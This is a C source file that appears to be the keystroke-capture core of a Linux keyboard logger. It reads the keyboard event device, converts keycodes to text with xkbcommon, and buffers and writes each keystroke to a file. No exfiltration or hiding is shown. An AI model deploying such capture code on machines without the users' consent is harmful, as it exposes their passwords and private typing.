#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <xkbcommon/xkbcommon.h>
#include "keyboard_handler.h"
#include "file_handler.h"
#include "utils.h"


int buffer_text_init(BufferText *buffer) {
    buffer->data = malloc(BUFFER_CAPACITY);
    if (!buffer->data){
        return 1;
    }
    buffer->size = 0;
    buffer->capacity = BUFFER_CAPACITY;
    buffer->data[buffer->size] = '\0';
    return 0;
}

int buffer_text_add(BufferText *buffer, const char *str, pthread_mutex_t *mutex, FileHandler *fh){
    int len = strlen(str);
    if (len >= BUFFER_CAPACITY){
        fprintf(stderr,
        "[Buffer Overflow] Attempted to write a string of length %d: \"%s\" — "
        "exceeds buffer capacity (%d bytes)\n",
        len, str, BUFFER_CAPACITY);
        return 1;
    }
    if (buffer->size + len >= BUFFER_CAPACITY){
        pthread_mutex_lock(mutex);
        FileHandler_write(fh, buffer->data);
        pthread_mutex_unlock(mutex);
        buffer->size = 0;
        buffer->data[0] = '\0';
    }

    memcpy(buffer->data + buffer->size, str, len);
    buffer->size += len;
    buffer->data[buffer->size] = '\0';
    return 0;
}

void buffer_text_clear(BufferText *buffer){
    if (buffer->data){
        free(buffer->data);
        buffer->data = NULL;
        buffer->size = 0;
        buffer->capacity = 0;
    }
}

int write_or_buffer_event(FileHandler *file, BufferText *buffer, const char *event_str, pthread_mutex_t *mutex){
    if (pthread_mutex_trylock(mutex) == 0) {
        if (buffer->size){
            FileHandler_write(file, buffer->data);
            buffer->size = 0;
        }
        FileHandler_write(file, event_str);
        pthread_mutex_unlock(mutex);
        return 0;
    }
    if (buffer_text_add(buffer, event_str, mutex, file)){
        return 1;
    }
    return 0;
}

int get_key_string(struct xkb_state *state, xkb_keycode_t keycode, char *buffer, int buffer_len) {
    xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, keycode);
    const char *name = get_key_name(keysym);
    if (name) {
        strncpy(buffer, name, buffer_len - 1);
        buffer[buffer_len - 1] = '\0';
        return 0;
    }

    int len = xkb_state_key_get_utf8(state, keycode, buffer, buffer_len);
    if (len == 0){
        char keysym_name[64];
        xkb_keysym_get_name(keysym, keysym_name, sizeof(keysym_name));
        snprintf(buffer, buffer_len, "[%s]", keysym_name);
        return 0;
    }
    if (len + 1 > buffer_len){
        return 1;
    }
    return 0;
}

int open_file_event_keyboard(int *fd){
    char keyboard_device[128];
    if (findKeyboardDeviceFileName(keyboard_device)) {
        fprintf(stderr, "Keyboard device not found\n");
        return 1;
    }
    *fd = open(keyboard_device, O_RDONLY);
    if (*fd == -1){
        fprintf(stderr, "Error open file event keyboard\n");
        return 1;
    }
    return 0;
}